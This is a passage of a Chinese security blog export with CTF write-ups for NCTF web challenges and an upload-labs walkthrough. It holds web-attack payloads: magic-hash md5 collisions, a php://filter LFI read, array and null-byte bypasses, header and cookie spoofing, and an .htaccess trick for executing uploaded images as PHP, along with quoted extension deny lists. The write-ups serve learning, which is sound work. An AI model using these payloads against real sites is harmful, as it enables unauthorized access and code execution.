<span class="hljs-keyword">from</span> MD5 <span class="hljs-keyword">import</span> *

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_key</span><span class="hljs-params">()</span>:</span>  <span class="hljs-comment"># 生成64位的对称加密的密钥</span>
    list = []
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">64</span>):
        c = random.choice([<span class="hljs-string">'0'</span>, <span class="hljs-string">'1'</span>])
        list.append(c)
    res = <span class="hljs-string">""</span>.join(list)
    <span class="hljs-keyword">return</span> res

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read_file</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-keyword">try</span>:
        f = open(<span class="hljs-string">'text.txt'</span>,<span class="hljs-string">'r'</span>, encoding = <span class="hljs-string">'utf-8'</span>)
        text = f.read()
        f.close()
        print(<span class="hljs-string">"读取成功!"</span>)
        <span class="hljs-keyword">return</span> text
    <span class="hljs-keyword">except</span> IOError:
        print(<span class="hljs-string">"读取错误!"</span>)


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bin_to_str</span><span class="hljs-params">(bin_str)</span> :</span>   <span class="hljs-comment"># 8位二进制转字符，用于bob收到密后使用</span>
    res = <span class="hljs-string">""</span>
    tmp = re.findall(<span class="hljs-string">r'.&#123;8&#125;'</span>,bin_str)
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tmp :
        res += chr(int(i,<span class="hljs-number">2</span>))
    <span class="hljs-keyword">return</span> res</code></pre></div>

]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>古典密码</tag>
        <tag>DES</tag>
        <tag>RSA</tag>
        <tag>MD5</tag>
      </tags>
  </entry>
  <entry>
    <title>nctf</title>
    <url>/2020/08/29/nctf/</url>
    <content><![CDATA[<h1 id="nctf-1"><a href="#nctf-1" class="headerlink" title="nctf-1"></a>nctf-1</h1><a id="more"></a>

<h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>查看源码即可看到flag</p>
<h2 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a>md5 collision</h2><p>一道简单的md5漏洞题目</p>
<p><strong>md5函数漏洞</strong></p>
<p>源码</p>
<div class="hljs"><pre><code class="hljs php">$md51 = md5(<span class="hljs-string">'QNKCDZO'</span>);
$a = @$_GET[<span class="hljs-string">'a'</span>];
$md52 = @md5($a);
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($a))&#123;
<span class="hljs-keyword">if</span> ($a != <span class="hljs-string">'QNKCDZO'</span> &amp;&amp; $md51 == $md52) &#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"nctf&#123;*****************&#125;"</span>;
&#125; <span class="hljs-keyword">else</span> &#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"false!!!"</span>;
&#125;&#125;
<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">"please input a"</span>;&#125;</code></pre></div>

<p>即使用get方式传递一个参数a,使得a的值不等于<code>QNKCDZO</code>但是二者的md5值相同</p>
<p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>
<p>常见的payload有</p>
<div class="hljs"><pre><code class="hljs c++">QNKCDZO
<span class="hljs-number">240610708</span>
s878926199a
s155964671a
s214587387a
s214587387a
 sha1(str)
sha1('aaroZmOk')  
sha1('aaK1STfY')
sha1('aaO8zKZF')
sha1('aa3OFF9m')</code></pre></div>

<h2 id="签到2"><a href="#签到2" class="headerlink" title="签到2"></a>签到2</h2><p>提示输入口令，尝试输入发现只能输入十个字母，但是口令有11个字母</p>
<p>F12审查元素，修改输入框的<code>maxlength</code>值，大于11即可</p>
<p>再次输入口令即可。</p>
<p>考点为前端代码修改</p>
<h2 id="这题不是WEB"><a href="#这题不是WEB" class="headerlink" title="这题不是WEB"></a>这题不是WEB</h2><p>这道题还真不是web</p>
<p>进入题目链接，发现一张动图，本能的将其拖入动图查看器种，结果什么都没发现，于是打开winhex</p>
<p>在最后发现flag</p>
<h2 id="层层递进"><a href="#层层递进" class="headerlink" title="层层递进"></a>层层递进</h2><p> 题目为层层递进，通过<strong>F12</strong>中<strong>Sources</strong>功能，查看网站的包含情况，发现到可疑地址：<code>SO.html</code>，查看发现相似可以地址，最后在<code>404.html</code>源码中得到<strong>flag</strong>（竖排插入在标签中）： </p>
<p><img src="https://i.loli.net/2020/11/30/4W9UOAMgLTohsJP.png" srcset="/img/loading.gif" alt></p>
<h2 id="单身二十年"><a href="#单身二十年" class="headerlink" title="单身二十年"></a>单身二十年</h2><p><strong>tip:在这里找key</strong></p>
<p>点击发现url改变，跳转到了另一个页面</p>
<p>bp抓包试试，go一下，相应包中出现flag</p>
<p><img src="/2020/08/29/nctf/ds1.png" srcset="/img/loading.gif" alt></p>
<h2 id="phpencode"><a href="#phpencode" class="headerlink" title="phpencode"></a>phpencode</h2><p>一开始以为是解码，结果发现代码逻辑不对，直接运行php代码，出错</p>
<p>将最后的<code>eval</code>改为<code>echo</code>,提交运行即可</p>
<p><img src="https://i.loli.net/2020/11/30/iXYv8R4MDTfr1ul.png" srcset="/img/loading.gif" alt></p>
<h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><p> <strong>黑盒判断方法：<br>单纯的从URL判断的话，URL中path、dir、file、pag、page、archive、p、eng、语言文件等相关关键字眼的时候,可能存在文件包含漏洞。</strong> </p>
<p> 根据<strong>PHP伪协议</strong>尝试构造如下<strong>Payload：</strong><code>?file=php://filter/read=convert.base64-encode/resource=index.php</code>，将<strong>index.php</strong>的源码经过<strong>Base64编码</strong>输出 </p>
<p><code>PGh0bWw+CiAgICA8dGl0bGU+YXNkZjwvdGl0bGU+CiAgICAKPD9waHAKCWVycm9yX3JlcG9ydGluZygwKTsKCWlmKCEkX0dFVFtmaWxlXSl7ZWNobyAnPGEgaHJlZj0iLi9pbmRleC5waHA/ZmlsZT1zaG93LnBocCI+Y2xpY2sgbWU/IG5vPC9hPic7fQoJJGZpbGU9JF9HRVRbJ2ZpbGUnXTsKCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpewoJCWVjaG8gIk9oIG5vISI7CgkJZXhpdCgpOwoJfQoJaW5jbHVkZSgkZmlsZSk7IAovL2ZsYWc6bmN0ZntlZHVsY25pX2VsaWZfbGFjb2xfc2lfc2lodH0KCj8+CjwvaHRtbD4=</code></p>
<p>base64解码</p>
<div class="hljs"><pre><code class="hljs php+HTML">&lt;html&gt;
    &lt;title&gt;asdf&lt;&#x2F;title&gt;
&lt;?php
	error_reporting(0);
	if(!$_GET[file])&#123;echo &#39;&lt;a href&#x3D;&quot;.&#x2F;index.php?file&#x3D;show.php&quot;&gt;click me? no&lt;&#x2F;a&gt;&#39;;&#125;
	$file&#x3D;$_GET[&#39;file&#39;];
	if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;
		echo &quot;Oh no!&quot;;
		exit();
	&#125;
	include($file); 
&#x2F;&#x2F;flag:nctf&#123;edulcni_elif_lacol_si_siht&#125;
?&gt;
&lt;&#x2F;html&gt;</code></pre></div>

<h2 id="单身一百年也没用"><a href="#单身一百年也没用" class="headerlink" title="单身一百年也没用"></a>单身一百年也没用</h2><p>与单身二十年一样，抓包即可</p>
<h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p> <strong>Cookie，有时也用其复数形式 <a href="https://baike.baidu.com/item/Cookies/187064" target="_blank" rel="noopener">Cookies</a>。类型为“</strong>小型文本文件<strong>”，是某些网站为了辨别用户身份，进行<a href="https://baike.baidu.com/item/Session/479100" target="_blank" rel="noopener">Session</a>跟踪而储存在用户本地终端上的数据（通常经过加密），由用户<a href="https://baike.baidu.com/item/客户端/101081" target="_blank" rel="noopener">客户端</a>计算机暂时或永久保存的信息 。</strong></p>
<p> <strong>TIP: 0==not</strong> </p>
<p>bp抓包，将<code>cookie:login = 0</code>改<code>cookie:login=1</code>   go</p>
<h2 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h2><p>进入题目，提示robots协议</p>
<p><strong>robots协议也叫robots.txt（统一小写）是一种存放于<a href="https://baike.baidu.com/item/网站" target="_blank" rel="noopener">网站</a>根目录下的<a href="https://baike.baidu.com/item/ASCII" target="_blank" rel="noopener">ASCII</a>编码的<a href="https://baike.baidu.com/item/文本文件" target="_blank" rel="noopener">文本文件</a>，它通常告诉网络<a href="https://baike.baidu.com/item/搜索引擎" target="_blank" rel="noopener">搜索引擎</a>的漫游器（又称<a href="https://baike.baidu.com/item/网络蜘蛛" target="_blank" rel="noopener">网络蜘蛛</a>），此网站中的哪些内容是不应被搜索引擎的漫游器获取的，哪些是可以被漫游器获取的。因为一些系统中的URL是大小写敏感的，所以robots.txt的文件名应统一为小写。robots.txt应放置于网站的根目录下。如果想单独定义搜索引擎的漫游器访问子目录时的行为，那么可以将自定的设置合并到根目录下的robots.txt，或者使用robots<a href="https://baike.baidu.com/item/元数据" target="_blank" rel="noopener">元数据</a>（Metadata，又称元数据）。</strong></p>
<p><strong>robots协议并不是一个规范，而只是约定俗成的，所以并不能保证网站的隐私。</strong></p>
<p>查看robots.txt</p>
<p>url:<code>http://chinalover.sinaapp.com/web11/robots.txt</code></p>
<div class="hljs"><pre><code class="hljs php">TIP:sql.php
<span class="hljs-comment">//这里提示sql.php的源码如下</span></code></pre></div>

<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>($_GET[id]) &#123;
   mysql_connect(SAE_MYSQL_HOST_M . <span class="hljs-string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
  mysql_select_db(SAE_MYSQL_DB);
  $id = intval($_GET[id]);
  $query = @mysql_fetch_array(mysql_query(<span class="hljs-string">"select content from ctf2 where id='$id'"</span>));
  <span class="hljs-keyword">if</span> ($_GET[id]==<span class="hljs-number">1024</span>) &#123;
      <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt;no! try again&lt;/p&gt;"</span>;
  &#125;
  <span class="hljs-keyword">else</span>&#123;
    <span class="hljs-keyword">echo</span>($query[content]);
  &#125;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>大致意思：get方式传递一个id的参数,创建一个新的参数id存放取整后的值（intval()函数将参数变为整形）</p>
<p>之后将新的$id带入sql语句中查询。if语句中说明，get方式传递的值不能为1024。</p>
<p> <a href="http://chinalover.sinaapp.com/web11/sql.php?id=10" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web11/sql.php?id=10</a> 尝试id=10，无结果</p>
<p>id=1024出现 no! try again，说明只有id=1024的时候才会执行if语句</p>
<p>想到了intval()函数的作用，尝试id=1024.1</p>
<h2 id="GBK-Injection"><a href="#GBK-Injection" class="headerlink" title="GBK Injection"></a>GBK Injection</h2><p>宽字节注入，之前写过。</p>
<h2 id="x00"><a href="#x00" class="headerlink" title="/x00"></a>/x00</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> ($_GET[<span class="hljs-string">'nctf'</span>])) &#123;
       <span class="hljs-keyword">if</span> (@ereg (<span class="hljs-string">"^[1-9]+$"</span>, $_GET[<span class="hljs-string">'nctf'</span>]) === <span class="hljs-keyword">FALSE</span>)
           <span class="hljs-keyword">echo</span> <span class="hljs-string">'必须输入数字才行'</span>;
       <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strpos ($_GET[<span class="hljs-string">'nctf'</span>], <span class="hljs-string">'#biubiubiu'</span>) !== <span class="hljs-keyword">FALSE</span>)   
           <span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span>.$flag);
       <span class="hljs-keyword">else</span>
           <span class="hljs-keyword">echo</span> <span class="hljs-string">'骚年，继续努力吧啊~'</span>;
   &#125;</code></pre></div>

<p>试了试<code>?nctf[]=1</code>,出现了报错但是答案真就出来了</p>
<p>正儿八经的做法是<code>?nctf=1%00%23biubiubiu</code>，简单的代码审计</p>
<h2 id="bypass-again"><a href="#bypass-again" class="headerlink" title="bypass again"></a>bypass again</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'a'</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'b'</span>]))
&#123;
<span class="hljs-keyword">if</span> ($_GET[<span class="hljs-string">'a'</span>] != $_GET[<span class="hljs-string">'b'</span>])
<span class="hljs-keyword">if</span> (md5($_GET[<span class="hljs-string">'a'</span>]) == md5($_GET[<span class="hljs-string">'b'</span>]))
<span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span>.$flag);
<span class="hljs-keyword">else</span>
<span class="hljs-keyword">print</span> <span class="hljs-string">'Wrong.'</span>;
&#125; 
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>代码审计，get方式传递参数a和b,二者的值不同，但是md5值不同，此处又利用md5()漏洞</p>
<p> <strong>在PHP中，MD5是不能处理数组的，md5(数组)会返回null，所以md5(a[])null,md5(b[])null，md5(a[])=md5(b[])=null,这样就得到答案了。</strong> </p>
<p>payload:</p>
<p> <code>http://chinalover.sinaapp.com/web17/index.php?a[]=1&amp;b[]=3</code> </p>
<h2 id="伪装者"><a href="#伪装者" class="headerlink" title="伪装者"></a>伪装者</h2><p>bp抓包，添加<code>X-Forwarded-For=127.0.0.1</code>,发包即可</p>
<p> <strong>X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段</strong> </p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>sql</tag>
        <tag>md5</tag>
        <tag>代码审计</tag>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>uploads-labs</title>
    <url>/2020/09/16/uploads/</url>
    <content><![CDATA[<h1 id="upload-labs-1-10"><a href="#upload-labs-1-10" class="headerlink" title="upload-labs 1-10"></a>upload-labs 1-10</h1><a id="more"></a>



<h2 id="pass1"><a href="#pass1" class="headerlink" title="pass1"></a>pass1</h2><p>直接抓包修改文件后缀名为jpg,png,gif即可</p>
<h2 id="pass2"><a href="#pass2" class="headerlink" title="pass2"></a>pass2</h2><p>查看源码</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'type'</span>] == <span class="hljs-string">'image/jpeg'</span>) || ($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'type'</span>] == <span class="hljs-string">'image/png'</span>) || ($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'type'</span>] == <span class="hljs-string">'image/gif'</span>))</code></pre></div>

<p>这段代码说明是对文件的<code>MIME</code>类型进行了过滤，直接上传 1.php 抓包后修改文件类型为 <code>&#39;image/jpeg&#39; ,&#39;image/png&#39;,&#39;image/gif&#39;</code>,这三个类型都为图片</p>
<p>抓包修改MIME即可</p>
<p>知识点补充：</p>
<p> <strong>MIME类型对大小写不敏感，但是传统写法都是小写。</strong> </p>
<div class="hljs"><pre><code class="hljs applescript"><span class="hljs-built_in">text</span>/plain
<span class="hljs-built_in">text</span>/html
image/jpeg
image/png
audio/mpeg
audio/ogg
audio/*
video/mp4
<span class="hljs-built_in">application</span>/*
<span class="hljs-built_in">application</span>/json
<span class="hljs-built_in">application</span>/javascript
<span class="hljs-built_in">application</span>/ecmascript
<span class="hljs-built_in">application</span>/octet-stream</code></pre></div>

<p>更详细的解释，</p>
<h2 id="pass3"><a href="#pass3" class="headerlink" title="pass3"></a>pass3</h2><div class="hljs"><pre><code class="hljs php">$deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">'.asp'</span>,<span class="hljs-string">'.aspx'</span>,<span class="hljs-string">'.php'</span>,<span class="hljs-string">'.jsp'</span>);</code></pre></div>

<p>只禁止了.asp,.aspx,.php,.jsp后缀文件，可以使用php3,php5,php7,phtml等等后缀名绕过</p>
<h2 id="pass4"><a href="#pass4" class="headerlink" title="pass4"></a>pass4</h2><p><strong>.htaccess</strong>文件的作用</p>
<blockquote>
<ul>
<li>URL重写、自定义错误页面</li>
<li>MIME类型配置</li>
<li>访问权限控制等</li>
<li>主要体现在伪静态的应用</li>
<li>图片防盗链</li>
<li>自定义404错误页面</li>
<li>阻止/允许特定IP/IP段</li>
<li>目录浏览与主页</li>
<li>禁止访问指定文件类型</li>
<li>文件密码保护</li>
</ul>
</blockquote>
<div class="hljs"><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch "1.jpg"&gt;</span>
<span class="hljs-attribute"><span class="hljs-nomarkup">SetHandler</span></span> application/x-httpd-php
<span class="hljs-section">&lt;/FilesMatch&gt;</span></code></pre></div>

<p>这几句代码的意思：</p>
<p>通过.htaccess文件调用php解析器去解析一个文件名中只要包含”1.jpg”这个字符串的任意文件，</p>
<p>无论扩展名是什么(没有也行)，都以php的方式来解析</p>
<p>上传完.htaccess文件后直接上传一个 <code>1.jpg</code>即可</p>
<h2 id="pass5"><a href="#pass5" class="headerlink" title="pass5"></a>pass5</h2><div class="hljs"><pre><code class="hljs php">$is_upload = <span class="hljs-keyword">false</span>;
$msg = <span class="hljs-keyword">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'submit'</span>])) &#123;
    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">".php"</span>,<span class="hljs-string">".php5"</span>,<span class="hljs-string">".php4"</span>,<span class="hljs-string">".php3"</span>,<span class="hljs-string">".php2"</span>,<span class="hljs-string">".html"</span>,<span class="hljs-string">".htm"</span>,<span class="hljs-string">".phtml"</span>,<span class="hljs-string">".pht"</span>,<span class="hljs-string">".pHp"</span>,<span class="hljs-string">".pHp5"</span>,<span class="hljs-string">".pHp4"</span>,<span class="hljs-string">".pHp3"</span>,<span class="hljs-string">".pHp2"</span>,<span class="hljs-string">".Html"</span>,<span class="hljs-string">".Htm"</span>,<span class="hljs-string">".pHtml"</span>,<span class="hljs-string">".jsp"</span>,<span class="hljs-string">".jspa"</span>,<span class="hljs-string">".jspx"</span>,<span class="hljs-string">".jsw"</span>,<span class="hljs-string">".jsv"</span>,<span class="hljs-string">".jspf"</span>,<span class="hljs-string">".jtml"</span>,<span class="hljs-string">".jSp"</span>,<span class="hljs-string">".jSpx"</span>,<span class="hljs-string">".jSpa"</span>,<span class="hljs-string">".jSw"</span>,<span class="hljs-string">".jSv"</span>,<span class="hljs-string">".jSpf"</span>,<span class="hljs-string">".jHtml"</span>,<span class="hljs-string">".asp"</span>,<span class="hljs-string">".aspx"</span>,<span class="hljs-string">".asa"</span>,<span class="hljs-string">".asax"</span>,<span class="hljs-string">".ascx"</span>,<span class="hljs-string">".ashx"</span>,<span class="hljs-string">".asmx"</span>,<span class="hljs-string">".cer"</span>,<span class="hljs-string">".aSp"</span>,<span class="hljs-string">".aSpx"</span>,<span class="hljs-string">".aSa"</span>,<span class="hljs-string">".aSax"</span>,<span class="hljs-string">".aScx"</span>,<span class="hljs-string">".aShx"</span>,<span class="hljs-string">".aSmx"</span>,<span class="hljs-string">".cEr"</span>,<span class="hljs-string">".sWf"</span>,<span class="hljs-string">".swf"</span>,<span class="hljs-string">".htaccess"</span>);
        $file_name = trim($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>]);
        $file_name = deldot($file_name);<span class="hljs-comment">//删除文件名末尾的点</span>
        $file_ext = strrchr($file_name, <span class="hljs-string">'.'</span>);
        $file_ext = strtolower($file_ext); <span class="hljs-comment">//转换为小写</span>
        $file_ext = str_ireplace(<span class="hljs-string">'::$DATA'</span>, <span class="hljs-string">''</span>, $file_ext);<span class="hljs-comment">//去除字符串::$DATA</span>
        $file_ext = trim($file_ext); <span class="hljs-comment">//首尾去空</span>
        
        <span class="hljs-keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;
            $temp_file = $_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];
            $img_path = UPLOAD_PATH.<span class="hljs-string">'/'</span>.$file_name;
            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;
                $is_upload = <span class="hljs-keyword">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                $msg = <span class="hljs-string">'上传出错！'</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            $msg = <span class="hljs-string">'此文件类型不允许上传！'</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        $msg = UPLOAD_PATH . <span class="hljs-string">'文件夹不存在,请手工创建！'</span>;
    &#125;
&#125;</code></pre></div>

<p>本题与第十题完全一样，详细解答见第十题</p>
<p><img src="/2020/09/16/uploads/5.png" srcset="/img/loading.gif" alt></p>
<h2 id="pass6"><a href="#pass6" class="headerlink" title="pass6"></a>pass6</h2><div class="hljs"><pre><code class="hljs php">$is_upload = <span class="hljs-keyword">false</span>;
$msg = <span class="hljs-keyword">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'submit'</span>])) &#123;
    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">".php"</span>,<span class="hljs-string">".php5"</span>,<span class="hljs-string">".php4"</span>,<span class="hljs-string">".php3"</span>,<span class="hljs-string">".php2"</span>,<span class="hljs-string">".html"</span>,<span class="hljs-string">".htm"</span>,<span class="hljs-string">".phtml"</span>,<span class="hljs-string">".pht"</span>,<span class="hljs-string">".pHp"</span>,<span class="hljs-string">".pHp5"</span>,<span class="hljs-string">".pHp4"</span>,<span class="hljs-string">".pHp3"</span>,<span class="hljs-string">".pHp2"</span>,<span class="hljs-string">".Html"</span>,<span class="hljs-string">".Htm"</span>,<span class="hljs-string">".pHtml"</span>,<span class="hljs-string">".jsp"</span>,<span class="hljs-string">".jspa"</span>,<span class="hljs-string">".jspx"</span>,<span class="hljs-string">".jsw"</span>,<span class="hljs-string">".jsv"</span>,<span class="hljs-string">".jspf"</span>,<span class="hljs-string">".jtml"</span>,<span class="hljs-string">".jSp"</span>,<span class="hljs-string">".jSpx"</span>,<span class="hljs-string">".jSpa"</span>,<span class="hljs-string">".jSw"</span>,<span class="hljs-string">".jSv"</span>,<span class="hljs-string">".jSpf"</span>,<span class="hljs-string">".jHtml"</span>,<span class="hljs-string">".asp"</span>,<span class="hljs-string">".aspx"</span>,<span class="hljs-string">".asa"</span>,<span class="hljs-string">".asax"</span>,<span class="hljs-string">".ascx"</span>,<span class="hljs-string">".ashx"</span>,<span class="hljs-string">".asmx"</span>,<span class="hljs-string">".cer"</span>,<span class="hljs-string">".aSp"</span>,<span class="hljs-string">".aSpx"</span>,<span class="hljs-string">".aSa"</span>,<span class="hljs-string">".aSax"</span>,<span class="hljs-string">".aScx"</span>,<span class="hljs-string">".aShx"</span>,<span class="hljs-string">".aSmx"</span>,<span class="hljs-string">".cEr"</span>,<span class="hljs-string">".sWf"</span>,<span class="hljs-string">".swf"</span>,<span class="hljs-string">".htaccess"</span>,<span class="hljs-string">".ini"</span>);
        $file_name = trim($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>]);
        $file_name = deldot($file_name);<span class="hljs-comment">//删除文件名末尾的点</span>
        $file_ext = strrchr($file_name, <span class="hljs-string">'.'</span>);
        $file_ext = str_ireplace(<span class="hljs-string">'::$DATA'</span>, <span class="hljs-string">''</span>, $file_ext);<span class="hljs-comment">//去除字符串::$DATA</span>
        $file_ext = trim($file_ext); <span class="hljs-comment">//首尾去空</span>

        <span class="hljs-keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;
            $temp_file = $_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];
            $img_path = UPLOAD_PATH.<span class="hljs-string">'/'</span>.date(<span class="hljs-string">"YmdHis"</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).$file_ext;
            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;
                $is_upload = <span class="hljs-keyword">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                $msg = <span class="hljs-string">'上传出错！'</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            $msg = <span class="hljs-string">'此文件类型不允许上传！'</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        $msg = UPLOAD_PATH . <span class="hljs-string">'文件夹不存在,请手工创建！'</span>;
    &#125;
&#125;</code></pre></div>

<p>仔细查看源码会发现少了下面的这段代码</p>
<div class="hljs"><pre><code class="hljs php">$file_ext = strtolower($file_ext); <span class="hljs-comment">//转换为小写</span></code></pre></div>

<p>这里就可以大小写绕过。将文件后缀名改为<code>.pHp , .PHP</code>等</p>
<h2 id="pass7"><a href="#pass7" class="headerlink" title="pass7"></a>pass7</h2><div class="hljs"><pre><code class="hljs php">$is_upload = <span class="hljs-keyword">false</span>;
$msg = <span class="hljs-keyword">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'submit'</span>])) &#123;
    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">".php"</span>,<span class="hljs-string">".php5"</span>,<span class="hljs-string">".php4"</span>,<span class="hljs-string">".php3"</span>,<span class="hljs-string">".php2"</span>,<span class="hljs-string">".html"</span>,<span class="hljs-string">".htm"</span>,<span class="hljs-string">".phtml"</span>,<span class="hljs-string">".pht"</span>,<span class="hljs-string">".pHp"</span>,<span class="hljs-string">".pHp5"</span>,<span class="hljs-string">".pHp4"</span>,<span class="hljs-string">".pHp3"</span>,<span class="hljs-string">".pHp2"</span>,<span class="hljs-string">".Html"</span>,<span class="hljs-string">".Htm"</span>,<span class="hljs-string">".pHtml"</span>,<span class="hljs-string">".jsp"</span>,<span class="hljs-string">".jspa"</span>,<span class="hljs-string">".jspx"</span>,<span class="hljs-string">".jsw"</span>,<span class="hljs-string">".jsv"</span>,<span class="hljs-string">".jspf"</span>,<span class="hljs-string">".jtml"</span>,<span class="hljs-string">".jSp"</span>,<span class="hljs-string">".jSpx"</span>,<span class="hljs-string">".jSpa"</span>,<span class="hljs-string">".jSw"</span>,<span class="hljs-string">".jSv"</span>,<span class="hljs-string">".jSpf"</span>,<span class="hljs-string">".jHtml"</span>,<span class="hljs-string">".asp"</span>,<span class="hljs-string">".aspx"</span>,<span class="hljs-string">".asa"</span>,<span class="hljs-string">".asax"</span>,<span class="hljs-string">".ascx"</span>,<span class="hljs-string">".ashx"</span>,<span class="hljs-string">".asmx"</span>,<span class="hljs-string">".cer"</span>,<span class="hljs-string">".aSp"</span>,<span class="hljs-string">".aSpx"</span>,<span class="hljs-string">".aSa"</span>,<span class="hljs-string">".aSax"</span>,<span class="hljs-string">".aScx"</span>,<span class="hljs-string">".aShx"</span>,<span class="hljs-string">".aSmx"</span>,<span class="hljs-string">".cEr"</span>,<span class="hljs-string">".sWf"</span>,<span class="hljs-string">".swf"</span>,<span class="hljs-string">".htaccess"</span>,<span class="hljs-string">".ini"</span>);
        $file_name = $_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>];
        $file_name = deldot($file_name);<span class="hljs-comment">//删除文件名末尾的点</span>
        $file_ext = strrchr($file_name, <span class="hljs-string">'.'</span>);
        $file_ext = strtolower($file_ext); <span class="hljs-comment">//转换为小写</span>
        $file_ext = str_ireplace(<span class="hljs-string">'::$DATA'</span>, <span class="hljs-string">''</span>, $file_ext);<span class="hljs-comment">//去除字符串::$DATA</span>
        
        <span class="hljs-keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;
            $temp_file = $_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];
            $img_path = UPLOAD_PATH.<span class="hljs-string">'/'</span>.date(<span class="hljs-string">"YmdHis"</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).$file_ext;
            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;
                $is_upload = <span class="hljs-keyword">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                $msg = <span class="hljs-string">'上传出错！'</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            $msg = <span class="hljs-string">'此文件不允许上传'</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        $msg = UPLOAD_PATH . <span class="hljs-string">'文件夹不存在,请手工创建！'</span>;
    &#125;
&#125;</code></pre></div>

<p>跟第六关对比发现少了这句话</p>
